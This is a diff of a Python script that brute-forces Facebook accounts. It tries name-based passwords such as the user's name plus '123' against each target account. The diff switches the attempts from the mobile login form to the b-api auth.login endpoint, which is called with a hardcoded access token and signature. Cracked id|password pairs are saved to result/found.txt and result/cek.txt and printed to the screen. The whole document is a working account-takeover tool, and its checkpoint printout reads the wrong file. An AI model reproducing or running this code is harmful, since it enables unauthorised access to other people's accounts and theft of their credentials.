@@ -25,14 +25,15 @@ class AutoB:
 		try:
 			lid=[name+'123',name+'12345',name+'123456',name.lower()+'123',name.lower()+'12345',name.lower()+'123456',self.spas]
 			for x in lid:
-				data={'email':idd,'pass':x}
-				re=requests.post('https://mbasic.facebook.com/login',data=data,headers={'user-agent':'Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16'}).text
-				if 'save-device' in re or 'm_sess' in re:
+				data={'user':idd,'pw':x}
+				re=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+				jss=json.loads(re.text)
+				if 'access_token' in jss:
 					self.fnd+=1
 					pen=open('result/found.txt','a')
 					pen.write(f'{idd}|{x}\n')
 					break
-				elif 'checkpoint' in re:
+				elif 'www.facebook.com' in jss['error_msg']:
 					self.cek+=1
 					pen=open('result/cek.txt','a')
 					pen.write(f'{idd}|{x}\n')
@@ -70,8 +71,16 @@ class AutoB:
 			print("\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
 		else: print("\n[ :( ] nothing found")
 		if self.fnd > 0:
+			print("\nFOUND:")
+			print("="*30)
+			for i in open('result/found.txt','r').read().splitlines()[-+self.fnd:]: print(i)
+			print("="*30)
 			print("found result saved: result/found.txt")
 		if self.cek > 0:
+			print("\nCHCEKPOINT:")
+			print("="*30)
+			for i in open('result/found.txt','r').read().splitlines()[-+self.cek:]: print(i)
+			print("="*30)
 			print("check result saved: result/cek.txt")
 try:
 	AutoB()
